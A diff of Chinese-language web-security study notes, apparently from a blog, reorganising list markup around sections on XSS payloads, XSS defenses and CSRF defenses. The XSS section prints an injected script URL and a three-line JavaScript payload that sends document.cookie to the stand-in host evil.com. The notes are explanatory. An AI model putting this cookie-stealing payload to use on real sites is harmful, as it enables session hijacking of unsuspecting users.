@@ -7,22 +7,19 @@
 <li>DOM Based XSS：从效果来说也是“反射型”的，通过修改页面的DOM节点形成的XSS。</li>
 </ol>
 <h4 id="XSS攻击进阶"><a href="#XSS攻击进阶" class="headerlink" title="XSS攻击进阶"></a>XSS攻击进阶</h4><ol>
-<li>初探XSS Payload</li>
-</ol>
-<p>XSS攻击成功后，攻击者能够对用户单前浏览的页面植入恶意脚本，通过恶意脚本，控制用户浏览器。这些泳衣完成各种具体功能的恶意脚本，被称为“XSS payload”。</p>
-<p>XSS Payload实际上就是js脚本（还可以是Flash或其他富客户端的脚本）</p>
-<p>一个小例子——cookie劫持：<br>攻击者在URL中输入<br><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</code></p>
-<p>真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
-<p><code>evil.js</code>中的内容如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure>
-<p>这段代码在页面中插入了一个看不到的图片，同时把<code>document.cookie</code>对象作为参数发送到远程服务器。</p>
-<ol>
-<li>强大的XSS Payload</li>
-</ol>
-<p>。。。。。</p>
-<ol>
-<li>XSS的防御</li>
-</ol>
+<li><p>初探XSS Payload</p>
+<p> XSS攻击成功后，攻击者能够对用户单前浏览的页面植入恶意脚本，通过恶意脚本，控制用户浏览器。这些泳衣完成各种具体功能的恶意脚本，被称为“XSS payload”。</p>
+<p> XSS Payload实际上就是js脚本（还可以是Flash或其他富客户端的脚本）</p>
+<p> 一个小例子——cookie劫持：<br> 攻击者在URL中输入<br> <code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</code></p>
+<p> 真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
+<p> <code>evil.js</code>中的内容如下：</p>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure>
+<p> 这段代码在页面中插入了一个看不到的图片，同时把<code>document.cookie</code>对象作为参数发送到远程服务器。</p>
+</li>
+<li><p>强大的XSS Payload</p>
+<p> 。。。。。</p>
+</li>
+<li><p>XSS的防御</p>
 <ul>
 <li>HttpOnly</li>
 <li>输入检查：<br><code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>等</li>
@@ -34,6 +31,8 @@
 <li>处理富文本：网站允许用户提交一些自定义的HTML代码，称之为“富文本”，禁止一些危险的标签。</li>
 <li>防御DOM BASED XSS：js输出到HTML，也相当于一次XSS 的输出过程。分情况通过编码的方式解决。了解js输出到HTML的途径。</li>
 </ul>
+</li>
+</ol>
 <h3 id="第4章-跨站点请求伪造（CSRF）"><a href="#第4章-跨站点请求伪造（CSRF）" class="headerlink" title="第4章 跨站点请求伪造（CSRF）"></a>第4章 跨站点请求伪造（CSRF）</h3><h4 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h4><h4 id="CSRF进阶"><a href="#CSRF进阶" class="headerlink" title="CSRF进阶"></a>CSRF进阶</h4><h4 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h4><ol>
 <li>验证码：CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求，验证码需要用户的交互才能完成</li>
 <li>referer check: 检查请求是否来自于合法的“源”。但是服务器并非什么时候都能取到referer。</li>
